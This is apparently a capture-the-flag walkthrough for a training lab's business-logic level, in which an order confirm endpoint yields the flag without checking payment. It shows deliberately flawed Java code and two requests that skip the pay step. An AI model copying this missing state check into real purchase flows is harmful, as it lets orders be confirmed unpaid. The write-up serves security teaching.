# Level 3 — Process Skip

## Challenge Description

This challenge simulates an order purchase flow with three steps: Create → Pay → Confirm. However, the confirmation API does not validate the payment status. Attackers can skip the payment step and directly confirm the order.

**Objective**: Skip the payment step, directly confirm the order, and capture the Flag.

## Vulnerability Analysis

### Code Logic

Backend code: `ProcessSkipController.java`

```
GET  /api/challenge/biz-logic/order/products  — Get product list
POST /api/challenge/biz-logic/order/create     — Step 1: Create order
POST /api/challenge/biz-logic/order/pay        — Step 2: Pay order
POST /api/challenge/biz-logic/order/confirm    — Step 3: Confirm order
```

**Normal flow**: Create → Pay → Confirm

**Exploit flow**: Create → Confirm (skip payment)

**Vulnerability**: The `confirmOrder()` method reads the `paid` field but still allows confirmation when `paid=false`.

### Source Code Snippet

```java
@PostMapping("/confirm")
public Map<String, Object> confirmOrder(@RequestBody Map<String, Object> request) {
    Boolean isPaid = (Boolean) order.get("paid");
    if (!isPaid) {
        String flag = flagService.getFlag("business-logic", "level3");
        result.put("paid", false);
        result.put("flag", flag);
    }
}
```

## Walkthrough

### Step 1: Create Order

```json
POST /api/challenge/biz-logic/order/create
{"productId": 1}
```

### Step 2: Skip Payment, Confirm Directly

```json
POST /api/challenge/biz-logic/order/confirm
{"orderId": "ORD-1703xxxxxx"}
```

### Step 3: Capture the Flag

The response contains the Flag when the unpaid order is confirmed.

## Related Files

| File | Description |
|------|-------------|
| `controller/challenge/businesslogic/ProcessSkipController.java` | Backend order flow endpoint |
| `service/FlagService.java` | Flag retrieval and validation |
